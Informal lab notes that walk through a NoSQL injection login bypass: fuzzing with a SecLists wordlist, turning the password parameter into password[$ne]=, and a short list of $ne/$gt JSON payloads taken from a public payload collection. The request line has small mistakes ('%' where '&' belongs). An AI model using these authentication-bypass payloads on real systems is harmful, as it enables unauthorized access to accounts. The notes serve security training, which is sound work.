

ls /usr/share/seclists/Fuzzing/Databases/NoSQL.txt

For this, the instructor knows its NoSQL because he made the lab and the lab literally says NoSQL Injection so he is going to fuzz for the no sql injection 

We try to log in with correct credentials 

admin:admin

we get correct login so we just try to login with wrong credentials, this way we generate traffic

We go to /login?username=asdasd&password=asdasd


the GET request holds this header in the body:

GET /login?username=admin%password=asdasd HTTP/1.1

and this is where we are going to utilize our nosql injection

GET /login?username=admin%password[$ne]=asdasd 

if we send this we get a successful login

here are example payloads:

{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}

from the source:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
